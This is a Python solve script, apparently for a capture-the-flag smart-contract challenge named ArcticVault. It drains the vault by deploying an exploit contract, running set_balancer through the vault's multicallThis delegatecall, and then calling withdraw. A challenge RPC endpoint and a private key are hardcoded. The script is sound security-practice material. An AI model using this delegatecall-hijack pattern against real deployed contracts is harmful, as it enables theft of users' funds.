from web3 import Web3
from solcx import install_solc
from eth_account import Account
from challenge import ArcticVaultContract
from setup import SetupContract
from exploit import ArcticVaultExploitContract

# Install the required Solidity version
install_solc("0.8.18")

# Configuration
UUID = "d2534115-82c3-4927-a41a-3eb41baa95e0"
RPCEndpoint = f" http://78.47.52.31:14354/d2534115-82c3-4927-a41a-3eb41baa95e0"
PrivateKey = "0xc452d1c1e3a332b06932188699aa940dd77bea1a747815909b06c313c22b5451"
SetupAddress = "0x734ceEd1586Ad8aB4828d2c07b667775f5eFD1ca"

# Set up Web3 instance
web3 = Web3(Web3.HTTPProvider(RPCEndpoint))

# Recover the public key from the private key
account = Account.from_key(PrivateKey)
WalletAddress = account.address

Setup = SetupContract(WalletAddress, PrivateKey, RPCEndpoint)
Setup.attach(SetupAddress)
VaultAddress = Setup.TARGET_address

ArticVault = ArcticVaultContract(WalletAddress, PrivateKey, RPCEndpoint)
ArticVault.attach(VaultAddress)


def get_balances():
    print()
    print()
    balance_wei = web3.eth.get_balance(WalletAddress)
    balance_ether = web3.from_wei(balance_wei, 'ether')
    print(f"Current Balance of ME: {balance_ether} ETH")
    # balance_wei = web3.eth.get_balance(SetupAddress)
    # balance_ether = web3.from_wei(balance_wei, 'ether')
    # print(f"Current Balance of Setup: {balance_ether} ETH")
    balance_wei = web3.eth.get_balance(VaultAddress)
    balance_ether = web3.from_wei(balance_wei, 'ether')
    print(f"Current Balance of VaultAddress: {balance_ether} ETH")



def solve():
    # Step 1: Deploy ArcticVaultExploit contract
    print("[+] Deploying ArcticVaultExploit contract...")
    Exploit = ArcticVaultExploitContract(WalletAddress, PrivateKey, RPCEndpoint)
    Exploit.deploy()
    ExploitAddress = Exploit.contract_address
    print(f"[+] ArcticVaultExploit deployed at: {ExploitAddress}")
    
    # Step 2: Prepare the data for the `set_balancer` delegatecall
    print("[+] Preparing data for multicallThis...")
    set_balancer_data = Exploit.contract.encodeABI(fn_name="set_balancer")
    print(f"[+] set_balancer data: {set_balancer_data}")

    # Step 3: Call `multicallThis` with the crafted data
    print("[+] Calling multicallThis to delegatecall set_balancer...")
    try:
        ArticVault.multicallThis([set_balancer_data])
        print("[+] multicallThis executed successfully!")
    except Exception as e:
        print(f"[!] Error in multicallThis: {e}")
        return

    # Step 4: Verify balances before withdrawal
    print("[+] Checking balances after delegatecall...")
    get_balances()

    # Step 5: Call withdraw to claim funds
    print("[+] Calling withdraw to claim funds...")
    try:
        ArticVault.withdraw()
        print("[+] Withdraw executed successfully!")
    except Exception as e:
        print(f"[!] Error in withdraw: {e}")
        return

    # Step 6: Verify balances after withdrawal
    print("[+] Final balances after withdrawal:")
    get_balances()





if __name__ == "__main__":

    for i in range(5):  # Adjust the range based on the number of variables in ArcticVault
        slot_data = web3.eth.get_storage_at(VaultAddress, i)
        print(f"Slot {i}: {slot_data.hex()}")


    # solve()